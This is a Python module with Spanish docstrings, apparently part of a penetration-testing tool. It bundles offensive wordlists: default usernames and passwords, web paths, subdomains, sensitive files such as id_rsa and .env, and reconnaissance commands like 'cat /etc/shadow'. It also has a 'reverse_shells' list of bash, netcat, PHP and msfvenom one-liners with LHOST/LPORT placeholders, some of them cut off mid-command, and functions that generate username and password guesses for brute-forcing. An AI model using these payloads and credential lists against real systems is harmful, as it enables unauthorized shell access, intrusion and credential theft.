from typing import List, Dict

WORDLISTS = {
    "common_usernames": [
        "admin", "root", "user", "test", "guest", "operator", "administrator",
        "support", "user1", "user2", "demo", "master", "service", "webadmin",
        "sysadmin", "manager", "hostmaster", "postmaster", "webmaster"
    ],
    
    "common_passwords": [
        "password", "123456", "12345678", "123456789", "qwerty", "abc123",
        "monkey", "1234567", "letmein", "trustno1", "dragon", "baseball",
        "iloveyou", "master", "sunshine", "ashley", "bailey", "shadow",
        "123123", "654321", "superman", "qazwsx", "michael", "football",
        "password1", "password123", "admin123", "welcome", "hello", "root123"
    ],
    
    "web_paths": [
        "admin", "administrator", "login", "wp-admin", "phpmyadmin", "cpanel",
        "webmail", "mail", "ftp", "cgi-bin", "scripts", "api", "backup",
        "backups", "db", "database", "sql", "old", "new", "test", "dev",
        "staging", "prod", "production", "stage", "include", "static",
        "assets", "images", "img", "uploads", "files", "downloads",
        "media", "content", "blog", "forum", "shop", "store", "cart",
        "admin.php", "login.php", "index.php", "admin.html", "login.html",
        ".git", ".svn", ".env", "config", "configuration", "settings"
    ],
    
    "subdomains": [
        "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1",
        "webdisk", "ns2", "cpanel", "whm", "autodiscover", "autoconfig",
        "m", "imap", "test", "ns", "mail2", "new", "mysql", "old",
        "lists", "support", "mobile", "mx", "static", "docs", "beta",
        "shop", "sql", "secure", "VPN", "vpn", "cloud", "passport",
        "cdn", "cdn2", "s3", "storage", "git", "svn", "jenkins", "ci",
        "staging", "gitlab", "bitbucket", "jira", "confluence", "portal",
        "dev", "developer", "app", "apps", "api", "v1", "v2", "v3",
        "intra", "internal", "corp", "corporate", "sharepoint"
    ],
    
    "http_methods": [
        "GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS",
        "TRACE", "CONNECT", "COPY", "LOCK", "MKCOL", "MOVE", "PROPFIND",
        "PROPPATCH", "SEARCH", "UNLOCK", "VERSION-CONTROL", "REPORT"
    ],
    
    "sensitive_files": [
        ".env", ".git/config", ".svn/entries", "wp-config.php", "config.php",
        "configuration.php", "settings.php", "database.php", "db.php",
        "connections.php", "application.php", "app_config.php", "php.ini",
        ".htaccess", ".htpasswd", "phpinfo.php", "info.php", "test.php",
        "readme.md", "README.md", "CHANGELOG.md", "LICENSE.md",
        ".DS_Store", "Thumbs.db", "desktop.ini", "web.config",
        "id_rsa", "id_rsa.pub", "authorized_keys", "known_hosts",
        "credentials.json", "secrets.json", "config.json", ".npmrc",
        ".bashrc", ".bash_history", ".mysql_history", ".psql_history"
    ],
    
    "cmds": [
        "whoami", "id", "uname -a", "cat /etc/passwd", "cat /etc/shadow",
        "ls -la", "ls -la /home", "ls -la /var/www", "ls -la /tmp",
        "pwd", "hostname", "ip addr", "ifconfig", "netstat -an",
        "ps aux", "top", "htop", "free -m", "df -h", "mount",
        "cat /etc/hosts", "cat /etc/resolv.conf", "cat /etc/fstab",
        "env", "set", "printenv", "declare -x", "compgen -v"
    ],
    
    "reverse_shells": [
        "bash -i>& /dev/tcp/{LHOST}/{LPORT} 0>&1",
        "python -c 'import socket,subprocess,os;s=socket.socket()",
        "perl -MIO -e '$p=fork;exit,if$p;$c=new IO::Socket::INET",
        "php -r '$s=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "ruby -rsocket -e'f=TCPSocket.new(\"{LHOST}\",{LPORT})",
        "nc -e /bin/sh {LHOST} {LPORT}",
        "nc -e cmd.exe {LHOST} {LPORT}",
        "powershell -NoP -NonI -W Hidden -Exec Bypass -Command",
        "msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe"
    ],
    
    "common_ports": [
        "21", "22", "23", "25", "53", "80", "110", "111", "135", "139",
        "143", "443", "445", "993", "995", "1723", "3306", "3389",
        "5900", "8080", "8443", "10000", "27017", "5432", "6379",
        "11211", "27018", "27019", "28017", "5000", "5001", "6000"
    ],
    
    "cve_keywords": [
        "sql injection", "xss", "cross-site scripting", "csrf", "csrf",
        "remote code execution", "rce", "command injection", "path traversal",
        "directory traversal", "lfi", "rfi", "ssrf", "xxe", "deserialization",
        "broken authentication", "broken access control", "sensitive data exposure",
        "xml external entities", "security misconfiguration", "xpath injection",
        "ldap injection", "nosql injection", "template injection", "ssti"
    ]
}


def get_wordlist(name: str) -> List[str]:
    """Obtiene una wordlist por nombre"""
    return WORDLISTS.get(name, [])


def get_all_wordlists() -> Dict[str, List[str]]:
    """Obtiene todas las wordlists"""
    return WORDLISTS


def get_wordlist_names() -> List[str]:
    """Lista nombres de wordlists disponibles"""
    return list(WORDLISTS.keys())


def search_wordlist(query: str) -> List[str]:
    """Busca en todas las wordlists"""
    results = []
    query_lower = query.lower()
    for name, words in WORDLISTS.items():
        for word in words:
            if query_lower in word.lower():
                results.append(f"[{name}] {word}")
    return results


def generate_username_wordlist(first_name: str = None, last_name: str = None, 
                                domain: str = None, year: int = None) -> List[str]:
    """Genera lista de usernames basada en información"""
    usernames = []
    
    base = []
    if first_name:
        base.append(first_name.lower())
    if last_name:
        base.append(last_name.lower())
    if domain:
        base.append(domain.lower().split('.')[0])
    
    for b in base:
        usernames.append(b)
        usernames.append(b + str(year) if year else b + "1")
        usernames.append(b + str(year) if year else b + "123")
        usernames.append(b + "." + last_name.lower() if last_name else b)
        usernames.append(b + "_" + last_name.lower() if last_name else b)
        usernames.append(first_name[0].lower() + last_name.lower() if first_name and last_name else b)
        usernames.append(first_name.lower() + last_name[0].lower() if first_name and last_name else b)
    
    return list(set(usernames))


def generate_password_wordlist(base_word: str = None, 
                               year: int = None, 
                               special: bool = True) -> List[str]:
    """Genera lista de passwords basada en palabra clave"""
    passwords = []
    
    common_suffixes = ["", "1", "12", "123", "1234", "12345", "!", "$", "@", "#"]
    years = [year] if year else [2020, 2021, 2022, 2023, 2024, 2025]
    
    if base_word:
        passwords.append(base_word)
        for suffix in common_suffixes:
            passwords.append(base_word + str(suffix))
            for yr in years:
                passwords.append(base_word + str(yr))
    
    passwords.extend(WORDLISTS["common_passwords"][:20])
    
    return list(set(passwords))
